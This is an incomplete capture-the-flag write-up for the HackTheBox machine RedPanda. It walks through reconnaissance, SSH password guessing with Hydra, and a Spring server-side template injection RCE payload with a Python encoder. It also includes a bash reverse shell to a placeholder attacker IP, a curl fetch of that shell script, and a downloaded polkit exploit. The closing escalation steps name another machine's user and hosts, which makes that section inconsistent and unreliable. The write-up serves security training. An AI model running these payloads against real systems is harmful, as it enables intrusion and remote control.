# RedPanda *INCOMPLETE*  
### A demonstration walkthrough of a pen test process using HTB's RedPanda with some normal dead ends as an example.  

#### Setup
/etc/hosts appended with "10.10.11.170 redpanda.htb"  
Firefox proxied via Zap, Zap proxied via Burp with intercept initially turned off  

Basic scan of all ports 
```
nmap -p- redpanda.htb
```
Shows ssh/22 and http/8080

The preferred way to scan.  A fast scan of all ports then a deeper scan for services on the found ports  
```
ports=$(nmap -p- --min-rate=1000 -T4  redpanda.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports redpanda.htb
nikto -h redpanda.htb:8080
```
Interesting Results (NMAP):  
- Running OpenSSH 8.2p1 and an unknown hhtp-proxy "Made by Spring Boot" in title  
Interesting Results (NIKTO):   
- /stats/ firectory discovered
- HTTP PUT and DELETE methods allowed  
- "content-disposition" header returned    

Browse for unlinked files/resources  
```
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://redpanda.htb:8080/FUZZ | grep -wv 404 | grep 0000
```
POST allowed to redpanda.htb:8080/search
Confirm /stats/ responds to GET requests

**DEAD END:** Running OWASP ZAP only turned up vectors for attacking RedPanda clients.
**DEAD END:** Browsing site showed nothing interesting in source.
**DEAD END:**  Using Hydra to guess common username/passwords for SSH.  Trying a small set of default username and password combinations work more often in real world vs. simulations.  
```
echo 'root\nuser\nadmin\nadministrator\ndevelopment\ntest\nredpanda\napache\nwoodenk\ndamian' > redpanda.htb.usernames
echo 'password\nPassword\nPassw0rd\nPassw0rd!' > redpanda.htb.passwords
hydra -L redpanda.htb.usernames -P redpanda.htb.passwords -e nsr ssh://redpanda.htb
```

**DEAD END:**  Attempted various SQLi, XXE, and Command injection on search function

### SSTI
A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.  

See [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) for further information.

We are provided with a list of payloads:
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
Some of the payloads didn't work, since some of the symbols (specificly #) are blacklisted by the server.

### Creating a RCE
The namp scan indicated the app is powered by "Spring Boot"  
Not being familar with Spring Boot, a Google found this good template [here](https://blog.hawkeyesecurity.com/2017/12/13/rce-via-spring-engine-ssti/)  
This returns /etc/passwd

Replace the blacklisted $ with #
```
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
This confirms the user "woodenk" with the standard home directory; still no password.

Python program to convert the command we want into a string suitable for SSTI in RedPanda search
```
#!/usr/bin/python3

def main():

        command = "whoami" # Edit this line for acceptable SSTI encoding 
        convert = []

        for x in command:
            convert.append(str(ord(x)))
        
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % convert[0]

        for i in convert[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"

        print(payload)

if __name__ == "__main__":
    main()
```
`command = "whoami"` confirms the website is running as user woodenk
### USER FLAG SUCCESS!
`command = "cat /home/woodenk/user.txt"` provides the user flag

### Plan for escalation
Using SSTI: 1) Upload shell script to create reverse shell.  2) Envoke shell script

Host the following shell script on the attacking machine.  I prefer:  `python -m http.server 8000`
```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.ATTACKER.IP/9001 0>&1"
```
SSTI to upload script
`command = "curl 10.10.ATTACKER.IP:8000/shell.sh --output /tmp/shell.sh"`

Create netcat listener, then invoke uploaded shell script
`nc -mvlp 9001`

SSTI to invoke script
`command = "bash /tmp/shell.sh"`

# Try LinPEAS to find escalation
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
```
# From github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
scp linpeas.sh dwight@office.paper:linpeas.sh
```

Running linpeas.sh shows vulnerables to  CVE-2021-3560

```
curl https://raw.githubusercontent.com/Almorabea/Polkit-exploit/main/CVE-2021-3560.py > exploit.py
scp exploit.py dwight@paper.htb:.
ssh dwight@paper.htb
```
```
python3 exploit.py
```

### ROOT SUCCESS!
